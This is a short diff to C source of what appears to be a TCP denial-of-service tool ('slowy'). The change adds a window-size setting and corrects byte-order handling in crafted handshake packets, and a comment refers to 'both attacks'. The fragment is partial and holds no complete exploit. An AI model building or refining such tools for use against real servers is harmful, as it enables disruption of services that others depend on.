@@ -57,7 +57,8 @@ typedef struct _tag_TCPCON {
 typedef struct _tag_SLOWY_CFG {
   INET_ADDR   shost;
   INET_ADDR   dhost;
-  int         mss;
+  int         mss;      /* default mss                       */
+  int         window;   /* window                            */
   int         zerowin;
   double      ltimeout; /* lost-packet timeout */
   double      ntimeout; /* next-packet timeout */
@@ -198,8 +199,9 @@ static void slowy__listen(THREAD_WORK *tw)
 
       /* prepare first request packet to schedule (common for both attacks) */
       c->offset  = 0;
-      c->seq     = TCP_HEADER(m->b)->ack_seq;
-      c->ack     = TCP_HEADER(m->b)->seq + 1;
+      c->window  = tc->window;
+      c->seq     = ntohl(TCP_HEADER(m->b)->ack_seq);
+      c->ack     = ntohl(TCP_HEADER(m->b)->seq) + 1;
       c->flags   = TH_ACK;
 
       /* send handshake */
@@ -208,9 +210,9 @@ static void slowy__listen(THREAD_WORK *tw)
                          &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                          &tc->dhost.addr.in.inaddr, tc->dhost.port,
                          c->flags,
-                         ntohs(c->window),
-                         ntohl(c->seq),
-                         ntohl(c->ack),
+                         c->window,
+                         c->seq,
+                         c->ack,
                          NULL, 0,
                          NULL, 0);
     }
